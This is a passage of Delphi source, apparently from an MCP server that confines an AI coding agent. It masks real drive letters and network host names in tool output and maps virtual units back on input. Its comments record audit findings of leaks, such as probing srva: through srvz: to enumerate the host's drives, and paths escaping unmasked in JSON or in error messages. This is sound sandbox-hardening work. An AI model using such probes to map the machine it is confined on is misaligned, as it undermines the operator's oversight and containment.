  Result := True;
end;

{ UN sitio de letra de red: declarado con letra y con un UNC por ruta de red.
  LA pregunta de las tres funciones de abajo (eran tres condiciones, y no la
  misma; segundo revisor de la 1.8.2). Con las dos rutas ya sin separador
  final y con barras de Windows. }
function EsSitioDeLetraDeRed(const ADecl, AReal: string): Boolean;
begin
  Result := (ADecl <> '') and not ADecl.StartsWith('\\') and
    EsUnc(AReal);
end;

{ El caracter de ANTES de la posicion AI de un texto que puede ser un JSON:
  alli un salto de linea son los dos caracteres \ y n, y lo que abre una
  linea no esta pegado a la letra n. Lo preguntan el barrido del enmascarador
  y la regla de las rutas de red (estaba escrito en los dos).
  Un escape es UNA barra - un numero impar de ellas -: con dos, es una barra
  ESCRITA y la letra es la de una carpeta ("C:\\t\\x" es C:\t\x, no un
  tabulador). Sin contarlas, la carpeta de una letra n, r o t hacia de salto
  de linea (1.9.0, al dar a la forma de red esta misma pregunta). }
function CaracterPrevio(const ATexto: string; AI: Integer): Char;
var
  K, Barras: Integer;
begin
  if AI <= 1 then
    Exit(#0);
  Result := ATexto[AI - 1];
  if (AI >= 3) and CharInSet(Result, ['n', 'r', 't']) and (ATexto[AI - 2] = '\') then
  begin
    Barras := 0;
    K := AI - 2;
    while (K >= 1) and (ATexto[K] = '\') do
    begin
      Inc(Barras);
      Dec(K);
    end;
    if Odd(Barras) then
      Result := #10;
  end;
end;

{ Lo que puede ir delante de una ruta de red: el principio, un blanco, una
  comilla, un parentesis, una coma, un igual, un ';' (una lista de rutas),
  <, >, |, [ o un salto de linea - o una opcion de una linea de ordenes
  pegada a ella (-U\nas\lib, -NU, /I) detras de un blanco o una comilla.
  Pegada a una carpeta NO: es el separador doblado del eco del enlazador
  (Linux64\\Debug), y tomarlo por una ruta de red se comia la cola entera
  (227 srvhost en una salida, 2026-08-26). }
function DelimitadorDeRed(const ATexto: string; AI: Integer): Boolean;
const
  ANTES: TSysCharSet = [' ', #9, '"', '''', '(', ',', '=', ';', '<', '>', '|', '[', #10, #13];
var
  K, Letras: Integer;
begin
  if AI <= 1 then
    Exit(True);
  if CharInSet(CaracterPrevio(ATexto, AI), ANTES) then
    Exit(True);
  K := AI - 1;
  Letras := 0;
  while (K >= 1) and CharInSet(ATexto[K], ['A'..'Z', 'a'..'z']) do
  begin
    Inc(Letras);
    Dec(K);
  end;
  Result := (Letras >= 1) and (Letras <= 2) and (K >= 1) and
    CharInSet(ATexto[K], ['-', '/']) and
    ((K = 1) or CharInSet(CaracterPrevio(ATexto, K), [' ', #9, '"', '''', #10, #13]));
end;

function FormaDeclaradaDe(const ARuta: string;
  const ADeclaradas, AReales: TArray<string>; AConLocales: Boolean): string;
var
  P, Decl, Real, Mejor, MejorReal: string;
  I: Integer;
begin
  Result := ARuta;
  P := PrefijoSinBarra(ARuta.Trim.Replace('/', '\'));
  // El prefijo y el sufijo se cuentan en la misma forma larga, tambien
  // cuando Git devuelve larga la ruta de un destino escrito en 8.3.
  if AConLocales and not EsUnc(P) then
    P := PrefijoSinBarra(FormaLarga(RaizSiUnidad(P)));
  // Por defecto solo UNC; los enlaces locales se traducen cuando lo piden.
  if not AConLocales and not EsUnc(P) then
    Exit;
  Mejor := '';
  MejorReal := '';
  for I := 0 to High(ADeclaradas) do
  begin
    if I > High(AReales) then
      Break;
    Decl := PrefijoSinBarra(ADeclaradas[I].Trim.Replace('/', '\'));
    Real := PrefijoSinBarra(AReales[I].Trim.Replace('/', '\'));
    // solo un sitio de letra de red. Uno en UNC (desde la 1.9.0 solo puede
    // serlo una carpeta de la zona de biblioteca) se queda con la
    // regla de siempre: vale en la forma en que se escribio
    if not EsSitioDeLetraDeRed(Decl, Real) and
       not (AConLocales and EsSitioConLetra(RaizSiUnidad(Decl)) and
         EsRutaAbsoluta(RaizSiUnidad(Real))) then
      Continue;
    if AConLocales and not EsUnc(Real) then
      Real := PrefijoSinBarra(FormaLarga(RaizSiUnidad(Real)));
    // bajo ESE sitio: el mismo, o lo que sigue a su separador (\\h\r\ab
    // no esta bajo \\h\r\a). De dos que casan, el mas hondo
    if EnLugar(RaizSiUnidad(P), RaizSiUnidad(Real), False) and
       (Length(Real) > Length(MejorReal)) then
    begin
      Mejor := Decl;
      MejorReal := Real;
    end;
  end;
  if Mejor <> '' then
  begin
    Result := Mejor + P.Substring(Length(MejorReal));
    // la raiz de la unidad misma: "L:" a secas es la carpeta ACTUAL de L:
    if (Length(Result) = 2) and (Result[2] = ':') then
      Result := Result + '\';
  end;
end;

{ La ruta de RED de un sitio declarado con letra, por la tabla de unidades de
  ESTA sesion y sin abrir nada: si la letra es una unidad de red conectada,
  su recurso mas el resto de la ruta; '' si no lo es. (Abrir el sitio para
  pedirle su ruta real daba lo mismo, y con el recurso caido dejaba
  esperando a quien lo pidiese: el enmascarador lo pide en cada respuesta.
  Segundo revisor de la 1.8.2.) }
function RutaDeRedDe(const ASitio: string): string;
var
  Unidad: string;
  Buf: array [0 .. 1023] of Char;
  N: DWORD;
begin
  Result := '';
  // (la letra y lo que es para esta sesion, por sus lectores: Lsp.NetDrives)
  if LetraDeRuta(ASitio) = #0 then
    Exit;
  Unidad := LetraDeRuta(ASitio) + ':';
  if ClaseDeLetra(Unidad[1]) <> clDeRed then
    Exit;
  N := Length(Buf);
  if WNetGetConnection(PChar(Unidad), Buf, N) <> NO_ERROR then
    Exit;
  Result := PrefijoSinBarra(string(PChar(@Buf[0]))) + ASitio.Substring(2);
end;

{ Los sitios de la sesion (raices y referencias) que son de una letra de red,
  con su ruta de red. UNA lista para quien traduce lo que contesta git y para
  el enmascarador. }
procedure SitiosEnLetraDeRed(out ADeclaradas, AReales: TArray<string>);
var
  L, Sitio, Real: string;
begin
  ADeclaradas := nil;
  AReales := nil;
  for L in WorkspaceRoots + WorkspaceReadOnlyRoots do
  begin
    Sitio := PrefijoSinBarra(L.Trim.Replace('/', '\'));
    Real := RutaDeRedDe(Sitio);
    if EsSitioDeLetraDeRed(Sitio, Real) then
    begin
      ADeclaradas := ADeclaradas + [Sitio];
      AReales := AReales + [Real];
    end;
  end;
end;

function FormaDeclarada(const ARuta: string; const AReferencia: string): string;
var
  Declaradas, Reales: TArray<string>;
begin
  // (lo que no es un UNC lo devuelve tal cual FormaDeclaradaDe; la lista
  // sale de la tabla de unidades, sin abrir nada)
  SitiosEnLetraDeRed(Declaradas, Reales);
  // Solo las raices que contienen el argumento ya admitido: no abrir las demas.
  if AReferencia <> '' then
    for var R in WorkspaceRoots + WorkspaceReadOnlyRoots do
      if EnLugar(AReferencia, R,
        (ClaseDeLetra(LetraDeRuta(R)) = clLocal) and
        (ClaseDeLetra(LetraDeRuta(AReferencia)) = clLocal)) then
      begin
        Declaradas := Declaradas + [R];
        Reales := Reales + [RealPath(R)];
      end;
  Result := FormaDeclaradaDe(ARuta, Declaradas, Reales, AReferencia <> '');
end;

function FormaDeclaradaEnTexto(const ATexto: string;
  const ADeclaradas, AReales: TArray<string>): string;
var
  Agujas, Cambios, Barras: TArray<string>;
  Decl, Real, Tmp: string;
  Sb: TStringBuilder;
  I, J, K, L, N: Integer;
  Hecho: Boolean;

  // ABarra: con que se separa en esa escritura. Solo se guarda para la raiz de
  // la unidad ("L:"), que la necesita cuando la ruta acaba ahi
  procedure Anade(const AReal, ADecl, ABarra: string);
  begin
    Agujas := Agujas + [AReal];
    Cambios := Cambios + [ADecl];
    if (Length(Decl) = 2) and (Decl[2] = ':') then
      Barras := Barras + [ABarra]
    else
      Barras := Barras + [''];
  end;

begin
  Result := ATexto;
  Agujas := nil;
  Cambios := nil;
  Barras := nil;
  for K := 0 to High(ADeclaradas) do
  begin
    if K > High(AReales) then
      Break;
    Decl := PrefijoSinBarra(ADeclaradas[K].Trim.Replace('/', '\'));
    Real := PrefijoSinBarra(AReales[K].Trim.Replace('/', '\'));
    if not EsSitioDeLetraDeRed(Decl, Real) then
      Continue;
    // las tres escrituras de la misma ruta: dobladas dentro de un JSON, las
    // de git y las de Windows. Cada una vuelve con SUS barras
    Anade(Real.Replace('\', '\\'), Decl.Replace('\', '\\'), '\\');
    Anade(Real.Replace('\', '/'), Decl.Replace('\', '/'), '/');
    Anade(Real, Decl, '\');
  end;
  if Length(Agujas) = 0 then
    Exit;
  // la mas larga primero: de dos sitios anidados, el mas hondo
  for I := 1 to High(Agujas) do
    for J := I downto 1 do
      if Length(Agujas[J]) > Length(Agujas[J - 1]) then
      begin
        Tmp := Agujas[J]; Agujas[J] := Agujas[J - 1]; Agujas[J - 1] := Tmp;
        Tmp := Cambios[J]; Cambios[J] := Cambios[J - 1]; Cambios[J - 1] := Tmp;
        Tmp := Barras[J]; Barras[J] := Barras[J - 1]; Barras[J - 1] := Tmp;
      end;
  L := Length(ATexto);
  Sb := TStringBuilder.Create(L + 16);
  try
    I := 1;
    while I <= L do
    begin
      Hecho := False;
      // una ruta EMPIEZA ahi: no detras de otra barra (la mitad de una
      // doblada, o el %(prefix)///host que git propone al operador), ni de
      // dos puntos (https://host), ni pegada a una palabra
      if CharInSet(ATexto[I], ['\', '/']) and
         not CharInSet(CaracterPrevio(ATexto, I), ['\', '/', ':', 'A' .. 'Z', 'a' .. 'z', '0' .. '9']) then
        for K := 0 to High(Agujas) do
        begin
          N := Length(Agujas[K]);
          // ...y ACABA ahi o sigue por una barra: \\h\r\ab no es \\h\r\a
          if (I + N - 1 <= L) and
             (StrLIComp(PChar(ATexto) + I - 1, PChar(Agujas[K]), N) = 0) and
             ((I + N > L) or CharInSet(ATexto[I + N],
                ['\', '/', '"', '''', ' ', #9, #10, #13, ')', ',', ';', '<', '>', '|'])) then
          begin
            Sb.Append(Cambios[K]);
            // la raiz de la unidad, cuando la ruta acaba ahi: "L:" a secas no
            // es una ruta, y el barrido la dejaba con su letra de verdad.
            // Acaba ahi si NO sigue por la barra de su escritura: detras de
            // //h/r, el \n de un JSON no es un separador (tercer revisor)
            if (Barras[K] <> '') and
               (StrLComp(PChar(ATexto) + I + N - 1, PChar(Barras[K]), Length(Barras[K])) <> 0) then
              Sb.Append(Barras[K]);
            Inc(I, N);
            Hecho := True;
            Break;
          end;
        end;
      if not Hecho then
      begin
        Sb.Append(ATexto[I]);
        Inc(I);
      end;
    end;
    Result := Sb.ToString;
  finally
    Sb.Free;
  end;
end;

function LibraryReadRoots: TArray<string>;
begin
  if not LibraryZoneEnabled then
    Exit(nil); // announced as it is enforced: no zone, nothing to announce
  Result := LibraryRoots;
end;

function ReadPathDenied(const APath: string): string;
var
  Fuera: Boolean;
begin
  // la jaula tal cual: sin perdones que acertar (hasta la 1.7.3 era PathDenied
  // menos una tabla de perdones por motivo; ver JaulaDenegada)
  Result := JaulaDenegada(APath, Fuera);
  // Refused for reading: say that a library zone exists and how to see it.
  // Field 2026-08-22: an agent listed the PARENT of a registered component
  // folder, got the plain jail refusal, and concluded list and read disagreed.
  // Solo si la zona EXISTE y solo para quien esta fuera de la jaula: se
  // pegaba a toda negativa, con la zona apagada (contradecia a WS-001) y a
  // las rutas invalidas (revision 27-sep-2026)
  if (Result <> '') and Fuera and LibraryZoneEnabled then
    Result := Result + ' ' + MsgText(SN_READ_ZONE_HINT);
end;

// ---------------------------------------------------------------------------
// Virtual drive units (srvd:, srvc:, ...)
// ---------------------------------------------------------------------------

var
  GDrvLock: TCriticalSection;
  // uppercase letters of every served drive, e.g. 'DC': [0] el modo local,
  // [i] el workspace i
  GDrvLetters: TArray<string>;
  GDrvLoaded: TArray<Boolean>;

{ The drives that can legitimately appear in tool output: those hosting the
  workspace roots, the library zone (RAD Studio + components) and the
  knowledge vault. Cached, POR WORKSPACE: se calculaban una vez por proceso,
  con el workspace de la PRIMERA llamada, y a otro con su raiz en otra unidad
  le salia esa raiz como srv0:\ y su srvn:\ como "not a drive of this
  server" hasta reiniciar (apuntado en la 1.8.2; medido el 1-oct-2026 con
  dos workspaces en dos unidades: dependia de quien llamase primero). }
function ServedDriveLetters: string;
var
  Letras: string;

  procedure AddDriveOf(const APath: string);
  begin
    if (Length(APath) >= 2) and (APath[2] = ':') and
       CharInSet(APath[1], ['A'..'Z', 'a'..'z']) and
       (Pos(UpCase(APath[1]), Letras) = 0) then
      Letras := Letras + UpCase(APath[1]);
  end;

var
  R: string;
  Ix: Integer;
begin
  Ix := 0;
  if HasActiveWS then
    Ix := TWorkspaceIx1; // las letras de ESTE workspace
  GDrvLock.Enter;
  try
    if (Ix <= High(GDrvLoaded)) and GDrvLoaded[Ix] then
      Exit(GDrvLetters[Ix]);
  finally
    GDrvLock.Leave;
  end;
  Letras := '';
  for R in WorkspaceRoots do
    AddDriveOf(R);
  for R in LibraryRoots do
    AddDriveOf(R);
  for R in WorkspaceReadOnlyRoots do
    AddDriveOf(R);
  // The vault is a served root of its OWN: it sits deliberately outside the
  // code jail and outside the library zone, so neither list carries it. A
  // vault on another letter used to leak that letter unmasked, and its
  // srvX: form did not resolve on the way in - it goes through the same
  // door as everybody else.
  AddDriveOf(VaultPath);
  GDrvLock.Enter;
  try
    if Ix > High(GDrvLoaded) then
    begin
      SetLength(GDrvLoaded, Ix + 1);
      SetLength(GDrvLetters, Ix + 1);
    end;
    GDrvLetters[Ix] := Letras;
    GDrvLoaded[Ix] := True;
  finally
    GDrvLock.Leave;
  end;
  Result := Letras;
end;

{ EL NOMBRADOR de la unidad virtual, y la inversa exacta de la funcion que
  viene justo debajo: esa LEE la forma, esta la ESCRIBE. Nadie la compone a
  mano en ningun sitio.

  Estaba escrita a mano en CUATRO: las tres formas de MaskDriveText (la ruta
  normal, el %3A de las URIs del motor, y la unidad a secas) y la lista de
  unidades validas de PathAnomaly. Las cuatro decian
  'srv' + Char(Ord(...) + 32), pero no igual: tres hacian UpCase antes y la
  cuarta no, apoyandose en que ServedDriveLetters promete mayusculas
  cuatrocientas lineas mas arriba. Ninguna estaba mal; era la forma de que
  una se desviase. Lo pregunto David el 2026-09-21 -"lo de enmascarar y
  desenmascarar las unidades esta centralizado, no?"- el dia despues de
  encontrar exactamente esta misma forma en los nombres de la papelera:
  alli el lector estaba unificado y habia TRES escritores.

  Una letra que este servidor no sirve sale como 'srv0': dice que hay una
  ruta y no dice donde. Era 'srvx', que es EXACTAMENTE lo que produce una
  unidad X: servida de verdad (una red mapeada como X: es lo normal): el
  nombrador dejaba de ser inyectivo y su inversa expandia el centinela a
  X:\ (auditoria 2026-09-21). El '0' no es letra: no puede chocar con
  nada servido, y VirtualUnitLetter lo reconoce para que PathAnomaly lo
  rechace POR NOMBRE con la lista de unidades validas, como a cualquier
  otra unidad no servida. }
function VirtualUnitOf(ALetter: Char; const AServed: string): string;
begin
  if (ALetter <> #0) and (Pos(UpCase(ALetter), AServed) > 0) then
    Result := 'srv' + Char(Ord(UpCase(ALetter)) + 32)
  else
    Result := 'srv0';
end;

{ The ONE place that recognizes the virtual-unit shape: 'srvd:', 'srvd:\x',
  'srvd:/x' - y el centinela 'srv0:', para que su rechazo sea el de una
  unidad no servida. Returns the upper-case letter, or #0 when the value is not a
  virtual unit at all. Both the inbound expansion and the rejection of an
  unserved unit ask this - the shape is never re-tested by hand. }
function VirtualUnitLetter(const AValue: string): Char;
begin
  Result := #0;
  if (Length(AValue) >= 5) and StartsText('srv', AValue) and
     CharInSet(AValue[4], ['A'..'Z', 'a'..'z', '0']) and (AValue[5] = ':') then
    if (Length(AValue) = 5) or CharInSet(AValue[6], ['\', '/']) then
      Result := UpCase(AValue[4]);
end;

{ 'srvd:\x' / 'srvd:/x' / bare 'srvd:' -> 'D:\x' ... Whole-value prefix match
  only; anything else comes back untouched (real paths keep working).
  Only a SERVED letter expands. Mapping an unserved 'srvz:' to the real 'Z:\'
  put a drive of the host into the rejection echo, and the outbound mask
  covers served letters only, so it travelled back raw: probing srva: .. srvz:
  enumerated the machine's drives (field round 10). An unserved unit now stays
  literal and PathAnomaly refuses it by name, without ever reaching disk. }
function ExpandDriveValue(const AValue: string): string;
var
  Letter: Char;
  Host, V: string;
begin
  Result := AValue;
  Letter := VirtualUnitLetter(AValue);
  if (Letter <> #0) and (Pos(Letter, ServedDriveLetters) > 0) then
    Exit(Letter + Copy(AValue, 5, MaxInt));
  // el HOST de un UNC sale enmascarado como srvhost (MaskDriveText) y nadie
  // lo leia de vuelta: el agente no podia repetir lo que el servidor le
  // ensenaba (GUARD-002). Vuelve solo si el operador declaro UN unico host
  // UNC entre sus lugares (novena revision, M5b)
  V := AValue.Replace('/', '\');
  if StartsText('\\srvhost\', V) then
  begin
    Host := HostUncDeclarado;
    if Host <> '' then
      Result := '\\' + Host + Copy(V, Length('\\srvhost') + 1, MaxInt);
  end;
end;

{ Rewrites the string arguments of a tools/call in place. Content-carrying
  parameters are never touched: their text belongs to files/messages, not to
  the path namespace. }
procedure ExpandVirtualDrives(const AArguments: TJSONObject);
begin
  ReescribeCadenas(AArguments,
    function(const ANombre, AValor: string): string
    begin
      Result := AValor;
      if not MatchText(ANombre, PARAMS_CON_CONTENIDO) then
        Result := ExpandDriveValue(AValor);
    end);
end;

type
  // de una linea de una respuesta: es contenido (va tal cual) o no
  TEsContenido = reference to function(const ALinea: string): Boolean;

// ATexto linea a linea: lo que no es contenido, enmascarado. El nucleo de
// EnmascaraSalvoContenido (git), EnmascaraSalvoCodigo (hover) y las citas
function EnmascaraLineas(const ATexto: string; const AEsContenido: TEsContenido): string;
var
  Lineas: TArray<string>;
begin
  Lineas := ATexto.Split([#10]);
  for var K := 0 to High(Lineas) do
    if not AEsContenido(Lineas[K]) then
      Lineas[K] := MaskDriveText('', Lineas[K]);
  Result := string.Join(#10, Lineas);
end;

// la linea es una cita que CitaDeLinea compuso en esta llamada (con su
// sangria delante y, si va en un texto CRLF, su CR detras)
function EsCitaHecha(const ALinea: string): Boolean;
var
  L: string;
begin
  Result := False;
  if TCitasHechas = '' then
    Exit;
  L := ALinea.TrimLeft;
  if L.EndsWith(#13) then
    L := L.Substring(0, L.Length - 1);
  Result := (L <> '') and (Pos(#0 + L + #0, #0 + TCitasHechas) > 0);
end;

function CitaDeLinea(N: Integer; const ATexto: string): string;
begin
  Result := IntToStr(N) + '|' + ATexto;
  TCitasHechas := TCitasHechas + Result + #0;
end;

function MaskDriveText(const AToolName, AText: string): string;
const
  // las tools cuyo ECO es contenido del disco (la nota de abajo dice por que)
  TOOLS_ECO: array [0 .. 6] of string = ('delphi_read', 'vault_read', 'vault_search',
    'delphi_search', 'delphi_edit', 'delphi_textedit', 'delphi_docs');
var
  Sb: TStringBuilder;
  Letters: string;
  I, L: Integer;
  C, PrevC: Char;
  EnJson: Boolean;
begin
  // delphi_read was the FIRST exemption: its payload is the file's TEXT, which
  // may legitimately contain "D:\..." that an edit anchor must match
  // byte-for-byte. delphi_fetch is NOT exempt (fixed after field round 4):
  // its payload is base64, whose alphabet has neither ':' nor '%', so
  // masking can never corrupt it - while its "path" field must be
  // virtualized like every other path the client sees.
  // The vault tools are exempt on the same grounds: their payload is the
  // TEXT of a note, and an agent copies fragments of it verbatim to build the
  // "anchor" / "old_text" of a later vault_append / vault_patch. Masking it
  // would silently break every anchored write (the fragment would no longer
  // match the file on disk). Vault paths are relative and carry no drive
  // letter, and the vault is knowledge the operator chose to expose.
  // ...and an exception that ESCAPED a tool is not content either. The
  // dispatcher wraps ANY exception as "Error executing tool: <E.Message>", and
  // a Delphi I/O exception embeds the REAL absolute path (EFOpenError: 'Cannot
  // open file "D:\..."'), reachable on a locked or ACL-denied file - the read
  // paths have no try/except of their own. Case-SENSITIVE and the exact
  // wrapper token on purpose: a delphi_read result starts with the FILE NAME
  // and a note may start with "Error", so a loose case-insensitive 'error'
  // test would silently mask real content and break every anchored write built
  // on it.
  // delphi_search joined them 2026-09-20, and it was the loudest of all:
  // its "text" field is a VERBATIM line of the file, published precisely so
  // an agent can copy it as an edit anchor - and the blanket mask rewrote
  // the drive letter INSIDE it. README.md:358 reads "Roots=D:\Projects\..."
  // and the search answered "Roots=srvd:\Projects\...": an anchor copied
  // from a hit could never match the disk, and a documentation file was
  // quoted wrong. It masks its own "path" fields instead (see there).
  // delphi_edit y delphi_textedit, por lo mismo y con una vuelta de tuerca:
  // su eco de verificacion son las lineas RELEIDAS DEL DISCO, que es la
  // prueba con la que el agente comprueba que escribio lo que queria. Si esa
  // prueba va enmascarada, no prueba nada. Encontrado escribiendo este mismo
  // CHANGELOG el 2026-09-20: se escribio "D:\Projects\Galatea", el disco lo
  // tenia bien, y el eco devolvia "srvd:\Projects\Galatea". Sus negativas
  // empiezan por su etiqueta con resultado y siguen enmascarandose por el test de
  // abajo.
  // delphi_docs (1.10.0): su texto es la AYUDA instalada, y sus ejemplos citan
  // rutas que no son de este servidor. Medido el 2-oct-2026 en la pagina de
  // TPath.Combine: 'E:\somewhere\' salia 'srv0:\somewhere\' y la ruta que
  // empieza por una barra, '\srvhost\file.txt': la documentacion de lo que
  // hace Combine con cada ruta quedaba en un sinsentido. Lo que compone ella
  // misma no lleva rutas: el id es <ayuda>:<pagina> y la nota da el nombre del
  // fichero de ayuda, sin carpeta.
  //
  // LA OBLIGACION QUE VIENE CON ESTAR EN ESTA LISTA, y es facil de olvidar:
  // la exencion es por TOOL, pero solo el ECO merece exencion. Todo lo que
  // una de estas tools COMPONGA ella misma -una ruta en un mensaje, un campo
  // "path" de un JSON- tiene que pasar a mano por MaskDriveText('', ruta),
  // que es esta misma funcion con el nombre de tool vacio. delphi_search lo
  // hace asi con sus campos "path" (ver Mcp.Tools.Workspace). delphi_textedit
  // NO lo hacia con la ruta de su "CREADO %s" y sacaba la letra real del
  // servidor; aqui ponia escrito que "sus ecos de exito no llevan rutas
  // absolutas", que era FALSO y es justo lo que hizo que nadie mirara. Lo
  // caza ya la bateria test_round40, en las dos direcciones: que no salga la
  // letra real, y que el contenido del disco NO venga enmascarado.
  // Lo que la propia tool ya enmascaro linea a linea (EnmascaraSalvoContenido):
  // ESE texto, y solo ese, pasa como esta. Se gasta al mirarlo.
  if (AToolName <> '') and (TSalidaHecha <> '') then
  begin
    var Hecha := TSalidaHecha;
    TSalidaHecha := '';
    if AText = Hecha then
    begin
      TCitasHechas := '';
      Exit(AText);
    end;
  end;
  if MatchText(AToolName, TOOLS_ECO) and
     // la RESPUESTA no es una negativa: se mira como EMPIEZA (MsgOutcome +
     // la regla de la marca), nunca una etiqueta de DENTRO: un delphi_read de
     // Lsp.Texts trae [X DENIED] en sus lineas, se tomaba por negativa y se
     // enmascaraba el CONTENIDO ('%s:' salia '%srv0:', medido 27-sep)
     (MsgOutcome(AText) = '') then
    Exit(AText);
  // ...y en lo demas (la NEGATIVA de una de esas tools, la respuesta de
  // cualquier otra), las lineas que CITAN el disco y que la tool compuso en
  // ESTA llamada (CitaDeLinea) son contenido y se dejan tal cual; el resto
  // (rutas del guard, mensajes) se enmascara linea a linea. Una pista
  // enmascarada no servia de ancla (novena revision, M5a). Solo las
  // compuestas: se adivinaba por la forma ('^\s*\d+\|') y pasaba cualquier
  // linea que lo pareciera (revision del 4-oct-2026)
  if (AToolName <> '') and (TCitasHechas <> '') then
  begin
    Result := EnmascaraLineas(AText, EsCitaHecha);
    TCitasHechas := '';
    Exit;
  end;
  Letters := ServedDriveLetters;
  if (Letters = '') or (AText = '') then
    Exit(AText);
  // ANTES del barrido: la ruta real de un sitio declarado en una letra de
  // red vuelve a su forma declarada, y el barrido le pone su unidad virtual.
  // git escribe //host/recurso/..., que este barrido no reconoce por su
  // forma (se llevaria los comentarios de un diff): salia el nombre de la
  // maquina, y worktree list daba rutas que el agente no podia devolver
  // (medido el 30-sep-2026). Lo traducido vuelve a entrar, ya sin nada que
  // traducir, para el barrido de siempre.
  var RedDecl, RedReal: TArray<string>;
  SitiosEnLetraDeRed(RedDecl, RedReal);
  if Length(RedDecl) > 0 then
  begin
    var Traducido := FormaDeclaradaEnTexto(AText, RedDecl, RedReal);
    if Traducido <> AText then
      Exit(MaskDriveText('', Traducido));
  end;
  Sb := TStringBuilder.Create(Length(AText) + 64);
  try
    I := 1;
    L := Length(AText);
    // un JSON escribe cada barra doble: alli \\x es UNA barra (una ruta que
    // cuelga de la raiz de la unidad) y la ruta de red es la de cuatro. La
    // forma de dos barras, la del texto plano, convertia \Shared\Lib de un
    // .dproj en \srvhost\Lib (delphi_config view, medido el 2-oct-2026), y
    // los ejemplos de la ayuda igual. Lo que llega aqui como JSON es el
    // resultado entero de una tool: los demas llamadores pasan una ruta o una
    // linea de texto, y para ellos nada cambia. Un JSON de una tool es un
    // objeto; una lista empezaria por [{, [" o []. Un [ a secas NO: es la
    // etiqueta de una negativa ([GUARD-002 DENIED] ...), que es texto plano
    // y lleva su ruta de red con dos barras (lo cazo test_round22, M2)
    while (I <= L) and CharInSet(AText[I], [' ', #9, #10, #13]) do
      Inc(I);
    EnJson := (I <= L) and ((AText[I] = '{') or ((AText[I] = '[') and
      (I + 1 <= L) and CharInSet(AText[I + 1], ['{', '"', ']'])));
    I := 1;
    while I <= L do
    begin
      C := AText[I];
      // Any drive letter, not only the served ones. The mask was a C/D
      // allowlist, so E:\secret\x.inc or z:\... walked out untouched
      // (found 2026-08-25 by an auditor). Nothing real leaks on THIS machine
      // today - only C: and D: exist and both are mapped - but a root on
      // another drive, or a file referenced from one, would have. An
      // unmapped letter travels as srv0: : the reader learns there is a path
      // and learns nothing about where.
      if CharInSet(UpCase(C), ['A' .. 'Z']) then
      begin
        // ...but by the time this runs the text is already JSON, where a line
        // break is the two characters \ and n. That made the LETTER 'n' the
        // previous char for every path that starts a line, and the guard below
        // let it through unmasked: the real C:\Program Files... leaked in
        // multi-line fields (build outputTail) while the same path masked fine
        // inside single-line ones (errors[]). Measured, field round 8.
        PrevC := CaracterPrevio(AText, I);
        // A drive prefix only starts where the previous char is not a
        // letter/digit (keeps git's "HEAD:" and words intact).
        if not CharInSet(PrevC, ['A'..'Z', 'a'..'z', '0'..'9']) then
        begin
          // form A - plain path: <letter>:<separator> (D:\ or D:/)
          if (I + 2 <= L) and (AText[I + 1] = ':') and
             CharInSet(AText[I + 2], ['\', '/']) then
          begin
            Sb.Append(VirtualUnitOf(C, Letters)).Append(':');
            Inc(I, 2);
            Continue;
          end;
          // form B - percent-encoded colon in a file URI: <letter>%3A/ ...
          // (DelphiLSP answers with file:///D%3A/... - measured, R3-1).
          if (I + 4 <= L) and (AText[I + 1] = '%') and (AText[I + 2] = '3') and
             ((AText[I + 3] = 'A') or (AText[I + 3] = 'a')) and (AText[I + 4] = '/') then
          begin
            // Aqui los dos puntos van codificados (%3A), asi que el nombrador
            // pone la unidad y el separador se copia tal cual viene.
            Sb.Append(VirtualUnitOf(C, Letters));
            Sb.Append(AText[I + 1]).Append(AText[I + 2]).Append(AText[I + 3]);
            Inc(I, 4);
            Continue;
          end;
          // forma B2 - la unidad SIN separador detras: "D:" a secas, o una
          // ruta relativa a la unidad como "D:foo\bar". La forma A pide
          // <letra>:<separador>, asi que estas salian con la LETRA REAL en
          // cada negativa que echoa el parametro del que llama:
          //   delphi_list root="D:"       -> RECHAZADO: "D:" esta FUERA...
          //   delphi_git  repo="C:"       -> idem, en todas las tools
          // Y eso no es solo incumplir el contrato: como C:\Windows si sale
          // como srvc:, el lector deduce el mapeo entero. Medido 2026-09-20
          // por un agente auditor; es la misma forma del roots:["D:"] de esa
          // misma manana.
          //
          // Donde NO se toca, para no estropear texto que no es una ruta:
          // si tras los dos puntos viene un ESPACIO ("opcion C: haz esto") o
          // un DIGITO (una clave JSON de una letra, "a":1), se deja como
          // esta. Una ruta nunca empieza por espacio, y "D:1" no es un caso
          // que se de aqui.
          if (I + 1 <= L) and (AText[I + 1] = ':') and
             ((I + 2 > L) or
              not CharInSet(AText[I + 2],
                            [' ', #9, #10, #13, '0' .. '9'])) then
          begin
            Sb.Append(VirtualUnitOf(C, Letters)).Append(':');
            Inc(I, 2);
            Continue;
          end;
        end;
      end;
      // form C - a UNC path, whose HOST names the machine and what it can
      // see. Two shapes, and both have to be told apart from an ordinary
      // separator: by the time this runs the text is usually JSON, where a
      // single \ is written \\ - so "C:\\Users" is NOT a UNC, and a first
      // attempt at this rule happily turned it into "srvc:\srvhost" and ate
      // the rest of the path (caught by the battery, same day).
      //   raw text: \\host\share   - two, after a delimiter, then a letter
      //   inside JSON: \\\\host   - four, then a letter
      // The JSON form fires ONLY after a delimiter, like the raw form: the
      // Linux64 linker echoes its command line with backslashes ALREADY
      // doubled, which the JSON encoding doubles again - so mid-path every
      // re-doubled separator looked like a UNC opener and the whole tail
      // collapsed into srvhost after srvhost (sweep10's report, reproduced
      // 2026-08-26: 227 masks in one outputTail). A genuine UNC never starts
      // glued to a letter; a re-doubled path separator always does.
      // (el delimitador de antes, por CaracterPrevio: un UNC que ABRE LINEA
      // dentro de un JSON va detras de los caracteres \ y n, y salia con el
      // nombre de la maquina; apuntado en la 1.8.2, medido en la 1.9.0)
      // UNA regla para las dos formas, por la tira de barras (revision de la
      // 1.10.0: medido con LspTests.Rutas, el nombre de la maquina salia
      // detras de un ';' -una lista de rutas-, pegado a una opcion del
      // compilador -dcc64 -U\\nas\lib-, en el eco del enlazador doblado otra
      // vez dentro de un JSON -ocho barras-, en \\?\UNC\host y con un host
      // que empieza por _). En texto plano un UNC son 2 barras (o 4, el eco
      // doblado del enlazador); en JSON, 4 (u 8). Detras puede ir el prefijo
      // largo de Windows, ?\UNC\, con su separador.
      if (C = '\') and DelimitadorDeRed(AText, I) then
      begin
        var N := 0;
        while (I + N <= L) and (AText[I + N] = '\') do
          Inc(N);
        if (EnJson and ((N = 4) or (N = 8))) or (not EnJson and ((N = 2) or (N = 4))) then
        begin
          var J := I + N;
          var Sep := StringOfChar('\', N div 2);
          var Largo := '';
          if SameText(Copy(AText, J, 4 + 2 * Length(Sep)), '?' + Sep + 'UNC' + Sep) then
          begin
